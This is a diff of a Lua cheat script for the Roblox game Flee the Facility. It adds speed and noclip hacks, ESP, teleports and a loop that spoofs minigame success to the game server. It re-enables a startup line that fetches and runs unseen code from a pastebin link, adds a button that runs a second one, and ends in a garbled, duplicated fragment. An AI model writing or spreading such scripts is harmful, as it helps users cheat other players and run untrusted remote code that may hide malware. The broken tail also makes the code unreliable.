@@ -1,3 +1,18 @@
+--// SCRIPT MADE BY: Luna (EchoZoneScripts)
+--// Actually checks if the script is running
+if _G.IY_LOADED and not _G.IY_DEBUG then
+    warn("DB: VER_ALWAYS_RUNNING")
+    return
+end
+
+_G.IY_LOADED = true
+
+print("running... Debug?Static=true")
+
+wait(1)
+
+print("'" .. script.Name .. "' version loaded.")
+
 if game.GameId ~= 372226183 then
 	warn("Please play FLEE THE FACILITY to the script hub work.")
 	return
@@ -5,60 +20,58 @@ end
 
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()
 local Window = Rayfield:CreateWindow({
-   Name = "DIRSBLOX FTF hub",
-   Icon = 136729063013827, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   Name = "Hub For Dircs - FTF",
+   Icon = 136729063013827,
    LoadingTitle = "Loading, Press V to open",
    LoadingSubtitle = "made with love by luna ❤️",
-   ShowText = "Rayfield", -- for mobile users to unhide rayfield, change if you'd like
-   Theme = "Amethyst", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+   ShowText = "Rayfield",
+   Theme = "Amethyst",
 
-   ToggleUIKeybind = "V", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)
+   ToggleUIKeybind = "V",
 
    DisableRayfieldPrompts = false,
-   DisableBuildWarnings = true, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+   DisableBuildWarnings = true,
 
    ConfigurationSaving = {
       Enabled = false,
-      FolderName = nil, -- Create a custom folder for your hub/game
+      FolderName = nil,
       FileName = ""
    },
 
    Discord = {
-      Enabled = true, -- Prompt the user to join your Discord server if their executor supports it
-      Invite = "https://discord.gg/4YkCfGQm", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
-      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+      Enabled = false,
+      Invite = "",
+      RememberJoins = true
    },
 
-   KeySystem = false, -- Set this to true to use our key system
+   KeySystem = false,
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
-      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
-      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
-      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
-      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+      Note = "No method of obtaining the key is provided",
+      FileName = "Key",
+      SaveKey = true,
+      GrabKeyFromSite = false,
+      Key = {"Hello"}
    }
 })
 -- booting
---loadstring(game:HttpGet("https://pastebin.com/raw/JJh2xXEk"))()
-local t1 = Window:CreateTab("⚙️ | Basic Hacks", 4483362458) -- Title, Image
-local t3 = Window:CreateTab("🥽 | ESP", 4483362458) -- Title, Image
-local t4 = Window:CreateTab("👨‍💻 | Exploit", 4483362458) -- Title, Image
+loadstring(game:HttpGet("https://pastebin.com/raw/JJh2xXEk"))()
+local t1 = Window:CreateTab("⚙️ | Basic Hacks", 4483362458)
+local t3 = Window:CreateTab("🥽 | ESP", 4483362458)
+local t4 = Window:CreateTab("👨‍💻 | Exploit", 4483362458)
 
 local sectionWalkSpeed = t1:CreateSection("Walk speed")
 local sectionJumpPower = t1:CreateSection("Jump power")
 local sectionGravity = t1:CreateSection("World gravity")
 local sectionInfJump = t1:CreateSection("Inf jump")
---[[ t2
-local Section = t2:CreateSection("STUFF IN BETA!")
-]]
--- t3
+
 local sectionExp = t4:CreateSection("BETA - FTF Exploit")
 
 local player = game.Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:WaitForChild("Humanoid")
+
 -- ESP Toggles
 local function getBeast()
     for _, plr in pairs(game.Players:GetPlayers()) do
@@ -107,6 +120,7 @@ t3:CreateToggle({
         end
     end
 })
+
 -- ESP FreezePods
 t3:CreateToggle({
     Name = "ESP Pod",
@@ -148,7 +162,7 @@ t3:CreateToggle({
                     local a = Instance.new("Highlight", door)
                     a.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                     a.FillColor = Color3.fromRGB(255, 255, 0)
-                    a.OutlineColor = Color3.fromRGB(255, 255, 127)
+                    a.OutlineColor = Color3.fromRGB(255, 127, 127)
                 end
             end
         end
@@ -178,6 +192,7 @@ t3:CreateToggle({
         end
     end,
 })
+
 -- Basic Hacks buttons
 local noclip = false
 local char = character
@@ -200,6 +215,7 @@ game:GetService("RunService").Stepped:Connect(function()
         end
     end
 end)
+
 t1:CreateSlider({
     Name = "WalkSpeed",
     Range = {0, 50},
@@ -263,6 +279,7 @@ t1:CreateButton({
         end
     end,
 })
+
 -- FTF
 t1:CreateButton({
     Name = "Confuse Beast - USE BEFORE GET ROPED",
@@ -276,6 +293,7 @@ t1:CreateButton({
         end
     end,
 })
+
 t4:CreateButton({
     Name = "Unfreeze - LAST RESORT, USE IN FREEZER",
     Callback = function()
@@ -293,7 +311,173 @@ t4:CreateButton({
         end
     end,
 })
+
 t4:CreateSection("Teleports")
+t4:CreateButton({
+   Name = "TP To Map",
+   Callback = function()
+        local function findOBSpawnPadInParent()
+            for _, model in pairs(game.Workspace:GetChildren()) do
+                if model:IsA("Model") then
+                    local computerTable = model:FindFirstChild("ComputerTable")
+                    if computerTable and computerTable:IsA("Model") then
+                        local spawnPad = model:FindFirstChild("OBSpawnPad")
+                        if spawnPad and spawnPad:IsA("BasePart") then
+                            return spawnPad
+                        end
+                    end
+                end
+            end
+            return nil
+        end
+
+        local spawnPad = findOBSpawnPadInParent()
+        if spawnPad then
+            local plr = game.Players.LocalPlayer
+            local charLocal = plr.Character or plr.CharacterAdded:Wait()
+            if charLocal and charLocal.PrimaryPart then
+                charLocal:MoveTo(spawnPad.Position)
+            else
+                -- se não tiver PrimaryPart, tenta MoveTo mesmo assim
+                charLocal:MoveTo(spawnPad.Position)
+            end
+        else
+            Rayfield:Notify({
+                Title = "TP To Map",
+                Content = "OBSpawnPad não encontrado.",
+                Duration = 4,
+                Image = "error",
+            })
+        end
+   end,
+})
+
+-- Função recursiva para encontrar todos os modelos com um dado nome
+local function findAllModelsByName(parent, name)
+    local models = {}
+    for _, obj in pairs(parent:GetChildren()) do
+        if obj.Name == name and obj:IsA("Model") then
+            table.insert(models, obj)
+        end
+        if #obj:GetChildren() > 0 then
+            local foundModels = findAllModelsByName(obj, name)
+            for _, found in pairs(foundModels) do
+                table.insert(models, found)
+            end
+        end
+    end
+    return models
+end
+
+-- Lista para evitar repetir computadores recentes
+local recentComputers = {}
+
+-- Função que retorna um computador aleatório diferente dos recentes
+local function getRandomComputer()
+    local computerModels = findAllModelsByName(workspace, "ComputerTable")
+    if #computerModels == 0 then
+        return nil
+    end
+
+    local validComputers = {}
+    for _, computer in pairs(computerModels) do
+        if not table.find(recentComputers, computer) then
+            table.insert(validComputers, computer)
+        end
+    end
+
+    if #validComputers == 0 then
+        -- Se todos foram usados recentemente, reseta a lista para permitir repetir
+        recentComputers = {}
+        validComputers = computerModels
+    end
+
+    local randomIndex = math.random(1, #validComputers)
+    return validComputers[randomIndex]
+end
+
+-- Botão na aba Exploit (t4) para teleportar para PC aleatório
+t4:CreateButton({
+    Name = "TP to random PC",
+    Callback = function()
+        local playerLocal = game.Players.LocalPlayer
+        local characterLocal = playerLocal.Character or playerLocal.CharacterAdded:Wait()
+        local rootPart = characterLocal:WaitForChild("HumanoidRootPart")
+
+        local chosenComputer = getRandomComputer()
+
+        if chosenComputer and chosenComputer.PrimaryPart then
+            local targetPos = chosenComputer.PrimaryPart.Position + Vector3.new(0, 5, 0)
+            rootPart.CFrame = CFrame.new(targetPos)
+
+            table.insert(recentComputers, chosenComputer)
+            if #recentComputers > 3 then
+                table.remove(recentComputers, 1)
+            end
+        else
+            Rayfield:Notify({
+                Title = "TP to PC",
+                Content = "No computers found to teleport!",
+                Duration = 4,
+                Image = "error",
+            })
+        end
+    end,
+})
+
+t4:CreateButton({
+    Name = "Anti PC Error",
+    Callback = function()
+        _G.AutomaticHackingEnabled = not _G.AutomaticHackingEnabled
+
+        Rayfield:Notify({
+            Title = "Anti-PC-Error",
+            Content = _G.AutomaticHackingEnabled and "Enabled." or "Disabled.",
+            Duration = 6.5,
+            Image = 4483362458,
+        })
+
+        if _G.AutomaticHackingEnabled then
+            spawn(function()
+                while _G.AutomaticHackingEnabled do
+                    wait(0.25)
+                    local args = {
+                        "SetPlayerMinigameResult",
+                        true
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
+                end
+            end)
+        end
+    end,
+})
+
+t4:CreateButton({
+   Name = "TP to random Exit",
+   Callback = function()
+        local exitDoorModels = findAllModelsByName(game.Workspace, "ExitDoor")
+
+        if #exitDoorModels > 0 then
+            local randomIndex = math.random(1, #exitDoorModels)
+            local exitDoor = exitDoorModels[randomIndex]
+
+            local playerLocal = game.Players.LocalPlayer
+            local characterLocal = playerLocal.Character or playerLocal.CharacterAdded:Wait()
+            local rootPart = characterLocal:WaitForChild("HumanoidRootPart")
+
+            local pivotCFrame = exitDoor:GetPivot()
+            local behindDoorCFrame = pivotCFrame * CFrame.new(0, 0, -5)
+            rootPart.CFrame = behindDoorCFrame
+        end
+   end,
+})
+t4:CreateSection("Others")
+t4:CreateButton({
+   Name = "Remote audio control",
+   Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/3dWP6BW4"))()
+   end,
+})eateSection("Teleports")
 t4:CreateButton({
    Name = "TP To Map",
    Callback = function()
